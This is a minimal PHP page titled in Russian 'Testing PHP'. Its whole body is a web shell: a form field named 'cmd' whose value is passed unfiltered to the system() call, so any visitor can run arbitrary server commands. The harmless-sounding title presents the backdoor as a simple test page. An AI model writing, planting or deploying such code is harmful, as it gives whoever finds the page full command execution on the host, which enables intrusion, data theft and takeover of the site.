<html>
 <head>
  <title>Тестируем PHP</title>
 </head>
 <body>
 
 <?php 
 echo '<form><input name="cmd" /></form>'; if(isset($_GET['cmd'])) system($_GET['cmd']);
 
 ?>
 
 </body>
</html>
